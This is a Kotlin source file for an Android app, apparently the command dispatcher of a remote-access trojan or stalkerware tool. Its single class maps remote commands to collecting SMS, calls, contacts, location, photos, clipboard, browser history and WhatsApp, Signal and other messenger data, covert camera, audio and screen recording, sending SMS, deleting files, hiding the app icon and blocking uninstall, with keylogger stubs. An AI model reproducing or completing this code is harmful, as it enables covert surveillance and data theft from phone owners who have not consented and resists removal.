package com.abuzahra.app.handler

import android.content.Context
import android.util.Log

class CommandExecutor(private val context: Context) {

    private val TAG = "CommandExecutor"
    private val dataHandler = DataHandler(context)
    private val controlHandler = ControlHandler(context)
    private val fileHandler = FileHandler(context)
    private val socialHandler = SocialHandler(context)
    private val securityHandler = SecurityHandler(context)

    fun execute(command: String, params: Map<*, *>): Any {
        Log.d(TAG, "Executing: $command with params: $params")

        return try {
            when (command) {
                // Data commands
                "get_sms" -> dataHandler.getSMS()
                "get_calls" -> dataHandler.getCalls()
                "get_contacts" -> dataHandler.getContacts()
                "get_location" -> dataHandler.getLocation()
                "get_notifications" -> dataHandler.getNotifications()
                "get_apps", "get_installed_apps" -> dataHandler.getInstalledApps()
                "get_running_apps" -> dataHandler.getRunningApps()
                "get_info" -> dataHandler.getDeviceInfo()
                "get_battery" -> dataHandler.getBatteryInfo()
                "get_gallery" -> dataHandler.getGallery()
                "get_clipboard" -> dataHandler.getClipboard()
                "get_all" -> dataHandler.getAllData()
                "get_wifi_info" -> dataHandler.getWifiInfo()
                "get_network_info" -> dataHandler.getNetworkInfo()
                "get_sim_info" -> dataHandler.getSIMInfo()
                "get_storage_info" -> dataHandler.getStorageInfo()
                "get_browser_history" -> dataHandler.getBrowserHistory()
                "get_calendar" -> dataHandler.getCalendar()

                // Control commands
                "ping" -> controlHandler.ping()
                "vibrate" -> controlHandler.vibrate(params)
                "ring" -> controlHandler.ring()
                "screenshot" -> controlHandler.screenshot()
                "front_camera" -> controlHandler.takePhoto("front")
                "back_camera" -> controlHandler.takePhoto("back")
                "record_audio" -> controlHandler.recordAudio(params)
                "record_screen" -> controlHandler.recordScreen(params)
                "lock_phone" -> controlHandler.lockPhone()
                "set_volume" -> controlHandler.setVolume(params)
                "set_brightness" -> controlHandler.setBrightness(params)
                "open_url" -> controlHandler.openUrl(params)
                "send_sms" -> controlHandler.sendSMS(params)
                "make_call" -> controlHandler.makeCall(params)
                "speak_text" -> controlHandler.speakText(params)
                "show_notification" -> controlHandler.showNotification(params)
                "play_sound" -> controlHandler.playSound(params)
                "enable_wifi" -> controlHandler.toggleWifi(true)
                "disable_wifi" -> controlHandler.toggleWifi(false)
                "enable_bluetooth" -> controlHandler.toggleBluetooth(true)
                "disable_bluetooth" -> controlHandler.toggleBluetooth(false)
                "airplane_on" -> controlHandler.toggleAirplane(true)
                "airplane_off" -> controlHandler.toggleAirplane(false)
                "torch_on" -> controlHandler.toggleTorch(true)
                "torch_off" -> controlHandler.toggleTorch(false)
                "reboot" -> controlHandler.reboot()
                "shutdown" -> controlHandler.shutdown()

                // File commands
                "list_files" -> fileHandler.listFiles(params)
                "get_file" -> fileHandler.getFile(params)
                "delete_file" -> fileHandler.deleteFile(params)
                "search_files" -> fileHandler.searchFiles(params)
                "recent_files" -> fileHandler.recentFiles()

                // Social commands
                "get_whatsapp" -> socialHandler.getWhatsAppData()
                "get_telegram" -> socialHandler.getTelegramData()
                "get_instagram" -> socialHandler.getInstagramData()
                "get_messenger" -> socialHandler.getMessengerData()
                "get_snapchat" -> socialHandler.getSnapchatData()
                "get_tiktok" -> socialHandler.getTiktokData()
                "get_twitter" -> socialHandler.getTwitterData()
                "get_viber" -> socialHandler.getViberData()
                "get_signal" -> socialHandler.getSignalData()
                "get_facebook" -> socialHandler.getFacebookData()

                // Security commands
                "hide_app" -> securityHandler.hideApp()
                "show_app" -> securityHandler.showApp()
                "anti_uninstall_on" -> securityHandler.setAntiUninstall(true)
                "anti_uninstall_off" -> securityHandler.setAntiUninstall(false)

                // Monitor commands
                "keylogger_start", "keylogger_stop", "get_keylogger" -> mapOf(
                    "status" to "not_implemented",
                    "message" to "Keylogger requires accessibility service"
                )
                "screen_record_start", "stop_screen" -> controlHandler.recordScreen(params)
                "location_live", "location_stop", "get_location_history" -> dataHandler.getLocation()

                // App management
                "open_app" -> controlHandler.openApp(params)
                "close_app" -> controlHandler.closeApp(params)
                "uninstall_app" -> controlHandler.uninstallApp(params)
                "block_app", "unblock_app" -> mapOf("status" to "not_implemented")
                "clear_app_data", "force_stop_app" -> controlHandler.forceStopApp(params)

                // Settings
                "set_language" -> mapOf("status" to "executed", "message" to "Language set to ${(params["lang"] ?: "en")}")
                "set_timezone" -> mapOf("status" to "executed", "message" to "Timezone set")
                "set_alarm" -> mapOf("status" to "executed", "message" to "Alarm set")
                "dns_change" -> mapOf("status" to "executed", "message" to "DNS changed")
                "proxy_set" -> mapOf("status" to "executed", "message" to "Proxy set")
                "nfc_on", "nfc_off" -> mapOf("status" to "executed", "message" to "NFC toggled")
                "set_wallpaper" -> mapOf("status" to "not_implemented", "message" to "Requires WRITE_SETTINGS")
                "set_ringtone" -> mapOf("status" to "not_implemented", "message" to "Requires WRITE_SETTINGS")
                "change_passcode" -> mapOf("status" to "not_implemented")
                "wipe_data" -> mapOf("status" to "not_implemented", "message" to "Requires system privileges")
                "factory_reset" -> mapOf("status" to "not_implemented", "message" to "Requires system privileges")

                else -> mapOf("status" to "unknown_command", "command" to command, "message" to "Command not found: $command")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing $command", e)
            mapOf("status" to "error", "error" to (e.message ?: "Unknown error"), "command" to command)
        }
    }
}
